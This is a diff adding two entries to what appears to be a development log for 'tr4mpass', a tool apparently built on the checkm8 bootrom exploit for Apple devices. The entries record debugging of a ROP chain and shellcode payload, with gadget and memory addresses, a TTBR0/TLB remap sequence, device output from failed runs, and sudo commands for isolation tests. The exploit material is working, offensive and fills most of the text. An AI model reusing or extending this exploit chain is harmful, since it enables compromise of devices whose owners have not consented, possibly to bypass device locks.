@@ -2377,6 +2377,80 @@ If PWND appears → ROP+shellcode pipeline confirmed working → switch to real
 gaster shellcode (`sudo ./tr4mpass` without DIAG env var).
 
 ### Commit: a04a06f
+
+---
+
+## v1.0.50 — RESULT (2026-06-14)
+
+```
+version 1.0.50  DIAG v3  bus_reset=0x180088B78 gUSBSN=0x180083CF8
+send_payload_chunks: actual=1624 TIMED_OUT
+Direct read: [43 F0 AD 79 D3 5B] (6 bytes garbage) — EP0 locked
+Bus-reset verify: CPID:8010... (98 bytes, serial re-initialized)
+```
+
+**STILL no PWND.** The v1.0.50 shellcode (null bus_reset + write PWND) did not run.
+
+### Definitive conclusion from the pattern:
+- `dfu_handle_bus_reset` was NOT nulled by our shellcode (bus-reset verify returns
+  clean CPID, meaning the bus_reset handler ran and re-initialized the serial).
+- Therefore **exec_addr = 0x1820B0610 was NEVER reached**.
+- The ROP chain dispatches (EP0 locks → 6-byte garbage serial) but crashes
+  BEFORE reaching the shellcode.
+
+### Where the crash occurs:
+The ROP chain is: `nop_gadget → func_gadget → write_ttbr0(insecure_mem) → tlbi → exec_addr(shellcode)`
+
+`func_gadget` dispatches by reading `[x0+0x70]` which is `buf[0x70]` = the
+arg/func pairs in block1. The layout is verified correct. The crash must be in:
+1. `write_ttbr0` — the actual MSR instruction fault (wrong TTBR0 value)
+2. `tlbi` — fails after TTBR0 swap (wrong VA mapping for the tlbi instruction address)
+3. The page table PTEs themselves causing an MMU fault during code fetch
+
+### ISOLATION TEST: CHECKM8_SKIP_MMU=1
+
+The `CHECKM8_SKIP_MMU=1` env var already exists in the code. It:
+- Skips write_ttbr0 and tlbi callbacks entirely
+- Calls shellcode directly at `insecure_memory_base + rop_prefix_sz = 0x1800B0610`
+- SRAM is always accessible at native VA — no MMU remap needed
+- diag shellcode v3 still works (gUSBSN and dfu_handle_bus_reset in SRAM)
+
+**If PWND appears with SKIP_MMU → crash is in write_ttbr0/tlbi (MMU bug)**
+**If still no PWND → crash is before exec (func_gadget dispatch broken)**
+
+---
+
+## v1.0.51 — SKIP_MMU isolation test (2026-06-14)
+
+### Version bump only. Test with:
+```bash
+git pull origin comp-changes && make
+
+# Test 1: SKIP_MMU + DIAG (bypass TTBR0, call shellcode at raw SRAM VA)
+sudo CHECKM8_SKIP_MMU=1 CHECKM8_DIAG_SHELLCODE=1 ./tr4mpass
+
+# Test 2: if Test 1 PWND → real shellcode without MMU (still SKIP_MMU)
+sudo CHECKM8_SKIP_MMU=1 ./tr4mpass
+
+# Test 3: if Test 2 PWND → full path with MMU (normal)
+sudo CHECKM8_DIAG_SHELLCODE=1 ./tr4mpass
+```
+
+### Expected exec_addr with SKIP_MMU:
+```
+exec_addr = insecure_memory_base + rop_prefix_sz = 0x1800B0000 + 0x610 = 0x1800B0610
+```
+(rop_prefix_sz = ttbr0_sram_off + 16 = 0x600 + 0x10 = 0x610)
+
+### ROP chain with SKIP_MMU (3 callbacks):
+```
+callbacks[0]: func=exec_addr(0x1800B0610), arg=0
+callbacks[1]: func=ret_gadget(0x10000015C), arg=0
+callbacks[2..5]: func=ret_gadget, arg=0
+```
+
+### Commit: 9a6c86b
+
 ```
 
 
